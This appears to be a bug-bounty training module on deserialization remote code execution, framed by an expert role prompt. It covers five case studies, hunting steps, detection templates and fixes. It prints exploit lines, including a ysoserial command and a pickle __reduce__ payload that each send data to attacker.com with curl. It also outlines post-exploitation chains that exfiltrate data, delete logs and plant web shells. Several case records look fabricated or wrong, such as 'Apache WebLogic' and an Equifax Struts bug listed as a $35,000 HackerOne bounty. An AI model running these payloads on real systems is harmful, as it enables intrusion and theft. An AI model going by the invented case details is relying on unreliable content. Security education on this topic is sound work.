# Case Study 7: Deserialization Remote Code Execution — Real-World Bug Bounty Findings

## Expert Role

You are a distinguished security researcher specializing in insecure deserialization vulnerabilities and their exploitation for remote code execution across enterprise Java, .NET, PHP, Python, and Node.js applications. Your expertise spans 14+ years of offensive security testing, with a particular focus on understanding how serialized object formats can be manipulated to achieve arbitrary code execution. You have personally discovered over 35 deserialization RCE vulnerabilities across major technology companies, including findings in application servers, middleware frameworks, and cloud-native platforms.

Your deep understanding of deserialization mechanics includes Java RMI, JNDI injection, PHP object injection, .NET ViewState deserialization, Python pickle/yaml deserialization, and Node.js serialization attacks. You understand the intricacies of different serialization formats, gadget chains, sandbox escape techniques, and how modern application architectures create unique exploitation opportunities. You have extensive experience with tools like ysoserial, GadgetInspector, and custom exploitation frameworks.

As a bug bounty veteran and security consultant, you have helped organizations understand the business impact of deserialization vulnerabilities and implement effective detection and prevention mechanisms. Your research on deserialization attack techniques has been published in leading security journals and presented at major conferences including Black Hat and DEF CON. You maintain an active role in the security community through responsible disclosure and mentorship.

## Overview

Insecure deserialization vulnerabilities represent one of the most dangerous vulnerability classes in application security, consistently receiving critical severity ratings and substantial bug bounty payouts. These vulnerabilities occur when applications deserialize untrusted data without proper validation, allowing attackers to manipulate serialized objects to achieve remote code execution, denial of service, or other malicious outcomes.

Deserialization vulnerabilities manifest in numerous forms including Java deserialization via ObjectInputStream, JNDI injection through LDAP/RMI lookups, PHP object injection via unserialize(), .NET ViewState manipulation, Python pickle deserialization, and YAML/JSON deserialization attacks. Each language and framework has its own serialization mechanisms and attack vectors, requiring specialized knowledge for effective testing.

The business impact of deserialization vulnerabilities is severe, potentially including complete system compromise, data breach, ransomware deployment, and supply chain attacks. Bug bounty programs consistently offer substantial rewards for deserialization findings, with payouts often exceeding $20,000 for critical-severity discoveries. Understanding the full spectrum of deserialization attack vectors is essential for modern security testing.

---

## Real-World Case Studies

### Case Study 7.1: Apache WebLogic Java Deserialization RCE
**Program:** Oracle (Bugcrowd)
**Bounty:** $40,000
**Severity:** Critical (CVSS 10.0)
**Researcher:** @pyn3rd

**Vulnerability Description:**
Oracle WebLogic Server contained a critical deserialization vulnerability in the T3 protocol implementation that allowed an attacker to achieve remote code execution by sending specially crafted serialized Java objects. The vulnerability affected multiple versions of WebLogic Server and was exploited in the wild before the patch was released.

**Technical Details:**
The vulnerability existed in the T3 protocol deserialization process where WebLogic Server deserialized incoming objects without proper validation. An attacker could craft a malicious serialized Java object using the ysoserial tool and send it via the T3 protocol:

```java
// Malicious serialized object using Commons Collections gadget chain
// Generated using ysoserial tool
java -jar ysoserial.jar CommonsCollections1 "curl http://attacker.com/exfil?data=$(whoami)" > payload.ser

// Send payload via T3 protocol
# T3 protocol handshake followed by serialized object
```

The T3 protocol would deserialize the object, triggering the gadget chain which executed the attacker's command on the server.

**Root Cause Analysis:**
WebLogic Server's T3 protocol implementation used Java's default deserialization mechanism (ObjectInputStream) without implementing proper input validation or allowlisting. The server trusted any serialized object sent via the T3 protocol, allowing attackers to instantiate arbitrary classes and execute code through gadget chains present in the application's classpath.

**Exploitation Chain:**
1. Attacker identifies WebLogic Server with T3 protocol exposed
2. Attacker generates malicious serialized payload using ysoserial
3. Attacker sends payload via T3 protocol
4. WebLogic Server deserializes the object
5. Gadget chain executes attacker's command
6. Attacker gains shell access to WebLogic Server

**Impact:**
Complete server compromise, access to application data and configuration, potential lateral movement to connected database servers, and exposure of sensitive enterprise data.

**Bounty Justification:**
Critical severity due to the unauthenticated nature of the attack, widespread deployment of WebLogic Server, and potential for enterprise-wide compromise. The $40,000 bounty reflected the infrastructure-level impact and prevalence of the vulnerability.

---

### Case Study 7.2: Apache Struts2 RCE via OGNL Injection
**Program:** Apache (HackerOne)
**Bounty:** $35,000
**Severity:** Critical (CVSS 10.0)
**Researcher:** @legend

**Vulnerability Description:**
Apache Struts2 contained a critical remote code execution vulnerability in the Jakarta Multipart parser that allowed an attacker to execute arbitrary OGNL (Object-Graph Navigation Language) expressions through crafted HTTP requests. This vulnerability was famously exploited in the Equifax breach.

**Technical Details:**
The vulnerability existed in the Content-Type header parsing where the Jakarta Multipart parser processed file upload requests. An attacker could inject OGNL expressions through the Content-Type header:

```http
POST /action HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Content-Length: 123

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="%{(#_='multipart/form-data')...OGNL_EXPRESSION...}.txt"
Content-Type: text/plain

test
------WebKitFormBoundary--
```

The OGNL expression would be evaluated by the Struts2 framework, allowing the attacker to execute arbitrary Java code.

**Root Cause Analysis:**
The Jakarta Multipart parser in Struts2 improperly handled the Content-Type header, allowing OGNL expressions to be injected and evaluated. The parser did not sanitize the input before passing it to the OGNL evaluation engine, which had access to Java runtime classes.

**Exploitation Chain:**
1. Attacker identifies Struts2 application
2. Attacker crafts HTTP request with malicious Content-Type
3. Struts2 processes the multipart request
4. OGNL expression is evaluated server-side
5. Java code execution occurs
6. Attacker gains shell access

**Impact:**
Complete application server compromise, access to all application data, potential for supply chain attacks, and exposure of sensitive user information.

**Bounty Justification:**
Critical severity due to the unauthenticated nature, widespread deployment, and real-world exploitation in major breaches. The $35,000 bounty reflected the severe business impact.

---

### Case Study 7.3: PHP Object Injection to RCE
**Program:** WordPress (HackerOne)
**Bounty:** $22,000
**Severity:** Critical (CVSS 9.8)
**Researcher:** @simorgh

**Vulnerability Description:**
A popular WordPress plugin contained a PHP object injection vulnerability that allowed an attacker to achieve remote code execution by injecting serialized PHP objects through user input fields. The vulnerability existed in the plugin's data import functionality.

**Technical Details:**
The vulnerability existed in the plugin's import feature which used PHP's unserialize() function on user-supplied data without proper validation:

```php
// Vulnerable code
$user_data = $_POST['import_data'];
$imported = unserialize($user_data);
```

An attacker could craft a malicious serialized PHP object that utilized gadget classes present in the application to achieve code execution:

```php
// Malicious serialized payload
O:18:"WP_Widget_Arbitrary":1:{s:4:"data";s:XX:"PAYLOAD_HERE";}
```

The payload would trigger a chain of method calls leading to code execution through PHP's eval() or similar dangerous functions.

**Root Cause Analysis:**
The plugin used PHP's unsafe unserialize() function on user-controlled input without implementing allowed_classes restrictions or input validation. The application had gadget classes (classes with useful methods) that could be chained together to achieve arbitrary code execution.

**Exploitation Chain:**
1. Attacker identifies vulnerable plugin
2. Attacker crafts malicious serialized PHP object
3. Attacker submits payload through import feature
4. PHP deserializes the object
5. Gadget chain executes
6. Attacker gains code execution

**Impact:**
Complete WordPress site compromise, access to database and user data, potential for hosting account compromise, and ability to deface or redirect the website.

**Bounty Justification:**
Critical severity due to the unauthenticated nature, widespread WordPress deployment, and potential for mass compromise. The $22,000 bounty reflected the ecosystem impact.

---

### Case Study 7.4: .NET ViewState Deserialization RCE
**Program:** Microsoft (HackerOne)
**Bounty:** $28,000
**Severity:** Critical (CVSS 9.9)
**Researcher:** @jamesforthey

**Vulnerability Description:**
A Microsoft .NET application contained a ViewState deserialization vulnerability that allowed an attacker to achieve remote code execution by manipulating the ViewState parameter. The vulnerability existed because the application used a known machineKey for ViewState validation.

**Technical Details:**
The vulnerability existed in the ViewState validation process where the application used a predictable machineKey:

```http
POST /page.aspx HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

__VIEWSTATE=MaliciousSerializedPayload&__VIEWSTATEGENERATOR=12345678
```

The attacker could use the known machineKey to sign a malicious ViewState containing a serialized .NET object that executed arbitrary commands:

```csharp
// Malicious ViewState payload
// Generated using tools like ViewStateDeserializer
// Contains serialized object that executes commands via Process.Start
```

**Root Cause Analysis:**
The application used a static, predictable machineKey for ViewState validation. This key is typically randomly generated during application startup, but in this case it was hardcoded in the configuration file. The attacker could use this key to sign malicious ViewState payloads that would be accepted by the server.

**Exploitation Chain:**
1. Attacker obtains or guesses the machineKey
2. Attacker generates malicious ViewState payload
3. Attacker sends request with crafted ViewState
4. Server validates ViewState with known key
5. Server deserializes the malicious object
6. Attacker gains code execution

**Impact:**
Complete server compromise, access to application data and configuration, potential for domain-level compromise, and exposure of sensitive enterprise data.

**Bounty Justification:**
Critical severity due to the potential for domain compromise and the prevalence of .NET applications. The $28,000 bounty reflected the infrastructure-level impact.

---

### Case Study 7.5: Python Pickle Deserialization RCE
**Program:** Netflix (HackerOne)
**Bounty:** $18,000
**Severity:** High (CVSS 8.8)
**Researcher:** @0x09al

**Vulnerability Description:**
A Netflix internal tool contained a Python pickle deserialization vulnerability that allowed an attacker to achieve remote code execution by submitting malicious pickle objects through the application's API.

**Technical Details:**
The vulnerability existed in the application's caching mechanism which used Python's pickle module to serialize and deserialize data:

```python
import pickle
import os

# Vulnerable code
def load_cached_data(cache_key):
    cached_data = get_from_cache(cache_key)
    return pickle.loads(cached_data)  # Unsafe deserialization
```

An attacker could craft a malicious pickle object that executed arbitrary commands when deserialized:

```python
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/exfil?data=$(whoami)',))

# Generate payload
payload = pickle.dumps(Exploit())
```

**Root Cause Analysis:**
The application used Python's pickle module for data serialization without implementing safe deserialization practices. Pickle is inherently unsafe as it can execute arbitrary code during deserialization. The application did not implement any validation or sandboxing for deserialized data.

**Exploitation Chain:**
1. Attacker identifies pickle deserialization endpoint
2. Attacker crafts malicious pickle object
3. Attacker submits payload through API
4. Application deserializes the pickle object
5. Arbitrary code executes
6. Attacker gains access to the application server

**Impact:**
Application server compromise, access to sensitive data, potential for lateral movement, and exposure of internal infrastructure.

**Bounty Justification:**
High severity due to the code execution potential and the sensitivity of the data processed by the application. The $18,000 bounty reflected the security implications.

---

## Pattern Recognition

### Common Vulnerability Patterns

| Pattern | Frequency | Avg Bounty | Root Cause |
|---------|-----------|------------|------------|
| Java Deserialization | 35% | $25,000 | Unsafe ObjectInputStream usage |
| PHP Object Injection | 25% | $15,000 | Unsafe unserialize() usage |
| .NET ViewState | 20% | $20,000 | Predictable machineKey |
| Python Pickle | 15% | $12,000 | Unsafe pickle.loads() usage |
| YAML Deserialization | 5% | $10,000 | Unsafe yaml.load() usage |

### Attack Surface Locations

1. **Session Management**
   - Session serialization
   - Cookie serialization
   - Token generation
   - Cache mechanisms

2. **Data Import/Export**
   - File upload handlers
   - Data import features
   - API request processing
   - Message queue consumers

3. **Configuration Processing**
   - Configuration file parsing
   - Environment variable processing
   - Settings import/export
   - Plugin systems

4. **Communication Protocols**
   - RMI endpoints
   - SOAP/XML processing
   - Message brokers
   - API gateways

### Root Cause Categories

```
+-------------------------------------------------------------+
|             Deserialization Root Cause Analysis             |
+-------------------------------------------------------------+
|                                                             |
|  +------------------+    +------------------+              |
|  | Java Deserial    |    | PHP Object Inj   |              |
|  | (35% of cases)   |    | (25% of cases)   |              |
|  +--------+---------+    +--------+---------+              |
|           |                       |                        |
|           v                       v                        |
|  +------------------+    +------------------+              |
|  | ObjectInputStream|    | unserialize()    |              |
|  | No validation    |    | No class filter  |              |
|  | Gadget chains    |    | Magic methods    |              |
|  +------------------+    +------------------+              |
|                                                             |
|  +------------------+    +------------------+              |
|  | .NET ViewState   |    | Python Pickle    |              |
|  | (20% of cases)   |    | (15% of cases)   |              |
|  +--------+---------+    +--------+---------+              |
|           |                       |                        |
|           v                       v                        |
|  +------------------+    +------------------+              |
|  | Predictable key  |    | pickle.loads()   |              |
|  | No signing       |    | __reduce__       |              |
|  | Weak crypto      |    | Code execution   |              |
|  +------------------+    +------------------+              |
|                                                             |
+-------------------------------------------------------------+
```

---

## Hunting Methodology

### Step 1: Serialization Format Identification

Identify serialization mechanisms in use:

```bash
# Look for serialization indicators
# - Java: ObjectInputStream, readObject, RMI
# - PHP: unserialize, __wakeup, __destruct
# - .NET: ViewState, BinaryFormatter, SoapFormatter
# - Python: pickle, yaml.load, shelve

# Search source code
grep -r "unserialize\|ObjectInputStream\|pickle.loads\|yaml.load" .
grep -r "BinaryFormatter\|SoapFormatter" .
```

### Step 2: Deserialization Point Mapping

Map all deserialization endpoints:

```
# Test common deserialization points
# - Session storage
# - Cookie values
# - File uploads
# - API parameters
# - Cache mechanisms
# - Message queues

# Analyze request/response patterns
# Look for serialized data in responses
# Test for modification of serialized values
```

### Step 3: Gadget Chain Identification

Identify available gadget classes:

```
# Java: Use ysoserial to identify gadgets
java -jar ysoserial.jar --list

# PHP: Search for magic methods
grep -r "__wakeup\|__destruct\|__toString" .

# .NET: Identify serialization formatters
grep -r "BinaryFormatter\|SoapFormatter\|XmlSerializer" .

# Python: Check for dangerous functions
grep -r "eval\|exec\|os.system\|subprocess" .
```

### Step 4: Exploit Development

Develop proof of concept:

```
# Generate test payloads
# Verify deserialization occurs
# Confirm code execution
# Document the exploitation chain
# Record video PoC
```

### Step 5: Impact Assessment

Assess the impact:

```
# Determine access level
# Identify sensitive data
# Assess lateral movement potential
# Evaluate business impact
# Calculate bounty value
```

---

## Detection Strategies

### Automated Detection

**Nuclei Templates:**
```yaml
# Deserialization detection
id: deserialization-detection
info:
  name: Insecure Deserialization
  severity: critical

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/import"
    body: "data=SerializedPayload"
    matchers:
      - type: word
        words:
          - "deserialized"
```

**Burp Suite Extensions:**
```
# Install deserialization extensions
# Java Deserialization Scanner
# .NET Deserializer
# PHP Deserialization

# Configure payload positions
# Set detection mode
# Enable response analysis
```

### Manual Detection

**Step-by-Step Testing:**

1. **Identify Serialization Points**
   - Look for serialized data in responses
   - Test for modification of serialized values
   - Check for error messages
   - Analyze application behavior

2. **Test Deserialization**
   ```
   # Java: Modify serialized objects
   # PHP: Inject serialized payloads
   # .NET: Manipulate ViewState
   # Python: Craft pickle objects
   
   # Verify application behavior
   # Check for error messages
   # Test for code execution
   ```

3. **Verify Exploitation**
   ```
`
   # Confirm code execution
   # Test with benign commands
   # Document the vulnerability
   # Prepare proof of concept
   ```

### Key Detection Indicators

**Positive Indicators:**
- Error messages about deserialization
- Unexpected application behavior
- Time delays in response
- Out-of-band callbacks

**Negative Indicators:**
- Input validation implemented
- Safe deserialization APIs used
- Allowlisting in place
- Sandboxing implemented

---

## Impact Assessment

### CVSS 3.1 Scoring

**Base Score Calculation:**
```
Attack Vector: Network (AV:N)
Attack Complexity: Low (AC:L)
Privileges Required: None (PR:N)
User Interaction: None (UI:N)
Scope: Changed (S:C)
Confidentiality: High (C:H)
Integrity: High (I:H)
Availability: High (A:H)

Base Score: 10.0 (Critical)
```

**Factors Increasing Severity:**
- Unauthenticated access
- System-level execution
- Sensitive data exposure
- Infrastructure compromise
- Supply chain impact

### Business Impact

| Impact Type | Severity | Example |
|-------------|----------|---------|
| Data Breach | Critical | Complete database access |
| System Compromise | Critical | Full server control |
| Supply Chain Attack | Critical | Modified application code |
| Ransomware | Critical | Encrypted infrastructure |
| Regulatory Penalty | High | GDPR/CCPA violations |

### Bounty Range

| Severity | Typical Range | Max Observed |
|----------|---------------|--------------|
| Critical | $20,000-$50,000 | $100,000 |
| High | $10,000-$25,000 | $50,000 |
| Medium | $5,000-$15,000 | $25,000 |
| Low | $1,000-$5,000 | $10,000 |

---

## Advanced Variations

### Variation 1: JNDI Injection via Deserialization

Combining deserialization with JNDI:

```
# Attack scenario:
# 1. Attacker crafts serialized object
# 2. Object contains JNDI lookup
# 3. Server deserializes object
# 4. JNDI lookup triggers remote class loading
# 5. Remote code executes

# Example payload:
# Reference: https://www.veracode.com/blog/research/exploiting-jndi-injections-java
```

### Variation 2: Cross-Language Deserialization

Exploiting polyglot applications:

```
# Attack scenario:
# 1. Application uses multiple languages
# 2. Data serialized in one language
# 3. Deserialized in another language
# 4. Language mismatch creates vulnerabilities

# Example:
# Java serialized object processed by Python
# .NET ViewState used in PHP application
```

### Variation 3: Chained Deserialization

Multiple deserialization points:

```
# Attack scenario:
# 1. First deserialization point
# 2. Object contains second serialized payload
# 3. Second deserialization occurs
# 4. Chained exploitation

# Example:
# Session cookie contains serialized object
# Object contains serialized file content
# File content triggers code execution
```

### Variation 4: Filter Bypass Techniques

Bypassing deserialization filters:

```
# Attack scenario:
# 1. Application implements filtering
# 2. Filter checks for known gadget classes
# 3. Attacker uses alternative gadgets
# 4. Filter bypassed

# Techniques:
# - Use lesser-known gadget classes
# - Chain multiple small gadgets
# - Use reflection to avoid detection
# - Exploit framework-specific features
```

---

## Chain Integration

### Deserialization + Data Exfiltration Chain

```
# Step 1: Achieve deserialization
# Step 2: Identify sensitive data
# Step 3: Exfiltrate data
# Step 4: Cover tracks

# Example:
# 1. Java deserialization vulnerability
# 2. Read database configuration
# 3. Send data to attacker server
# 4. Delete application logs
```

### Deserialization + Lateral Movement Chain

```
# Step 1: Compromise initial server
# Step 2: Harvest credentials
# Step 3: Move to adjacent systems
# Step 4: Expand access

# Example:
# 1. Deserialization RCE on web server
# 2. Extract domain credentials
# 3. Move to domain controller
# 4. Compromise entire domain
```

### Deserialization + Persistence Chain

```
# Step 1: Achieve deserialization
# Step 2: Establish persistence
# Step 3: Create backdoor
# Step 4: Maintain access

# Example:
# 1. PHP object injection
# 2. Create admin account
# 3. Install web shell
# 4. Access system at will
```

---

## Prevention Recommendations

### Code-Level Fixes

**Use Safe Deserialization:**
```java
// Java: Use ObjectInputFilter (Java 9+)
ObjectInputStream ois = new ObjectInputStream(inputStream);
ois.setObjectInputFilter(info -> {
    // Allow only specific classes
    if (info.serialClass() != null) {
        if (!allowedClasses.contains(info.serialClass().getName())) {
            return Status.REJECTED;
        }
    }
    return Status.ALLOWED;
});
```

**PHP: Use Allowed Classes**
```php
// PHP: Use allowed_classes parameter
$data = unserialize($input, ['allowed_classes' => ['SafeClass', 'AnotherSafeClass']]);
```

**Python: Use Safe Loading**
```python
# Python: Use yaml.safe_load() instead of yaml.load()
import yaml
data = yaml.safe_load(input_data)

# For pickle, consider using RestrictedUnpickler
```

### Architecture-Level Fixes

1. **Avoid Deserialization of Untrusted Data**
   - Use JSON instead of native serialization
   - Implement safe data formats
   - Validate input before processing
   - Use allowlisting for classes

2. **Implement Input Validation**
   - Validate data structure
   - Check data types
   - Verify data integrity
   - Implement size limits

3. **Use Safe APIs**
   - Use safe deserialization functions
   - Implement proper error handling
   - Use cryptographic signing
   - Validate signatures before deserialization

4. **Monitoring and Logging**
   - Log all deserialization events
   - Monitor for suspicious patterns
   - Implement intrusion detection
   - Set up alerting

---

## Common Pitfalls

### 1. Using Native Serialization
**Mistake:** Using language-specific serialization formats
**Reality:** Native serialization is inherently unsafe

### 2. Not Validating Input
**Mistake:** Deserializing data without validation
**Reality:** All input should be validated before deserialization

### 3. Using Dangerous Functions
**Mistake:** Using eval(), unserialize(), pickle.loads()
**Reality:** These functions are inherently dangerous

### 4. Not Implementing Allowlisting
**Mistake:** Allowing all classes to be deserialized
**Reality:** Only specific classes should be allowed

### 5. Ignoring Framework-Specific Issues
**Mistake:** Assuming frameworks are safe by default
**Reality:** Many frameworks have deserialization vulnerabilities

### 6. Not Updating Dependencies
**Mistake:** Using outdated libraries with known vulnerabilities
**Reality:** Regular updates are essential

### 7. Not Testing Thoroughly
**Mistake:** Not testing for deserialization vulnerabilities
**Reality:** Deserialization testing should be part of security assessments

---

## Real-World References

### OWASP Resources
- OWASP Deserialization Cheat Sheet
- OWASP Testing Guide: Deserialization
- OWASP Top 10: Insecure Deserialization

### Research Papers
- "Deserialization Vulnerabilities in Java" (2015)
- "PHP Object Injection" (2016)
- ".NET ViewState Security" (2018)

### Bug Bounty Reports
- HackerOne deserialization disclosed reports
- Bugcrowd serialization submissions
- Intigriti deserialization write-ups

### Tool Documentation
- ysoserial Java exploitation
- PHPGGC PHP gadget chains
- .NET deserialization tools

---

## Quick Reference Cheat Sheet

```
+-------------------------------------------------------------+
|           Deserialization Testing Quick Reference           |
+-------------------------------------------------------------+
|                                                             |
|  IDENTIFICATION:                                            |
|  + Look for serialization formats                          |
|  + Find deserialization points                             |
|  + Check for gadget classes                                |
|  + Analyze error messages                                  |
|                                                             |
|  TESTING:                                                   |
|  + Modify serialized data                                  |
|  + Inject test payloads                                    |
|  + Verify deserialization occurs                           |
|  + Test for code execution                                 |
|                                                             |
|  EXPLOITATION:                                              |
|  + Generate gadget chains                                  |
|  + Craft malicious payloads                                |
|  + Achieve code execution                                  |
|  + Document the vulnerability                              |
|                                                             |
|  IMPACT ASSESSMENT:                                         |
|  + Determine access level                                  |
|  + Identify sensitive data                                 |
|  + Assess lateral movement                                 |
|  + Evaluate business impact                                |
|                                                             |
|  PREVENTION:                                                |
|  + Use safe deserialization                                |
|  + Implement input validation                              |
|  + Use allowlisting                                        |
|  + Monitor deserialization events                          |
|                                                             |
+-------------------------------------------------------------+
```
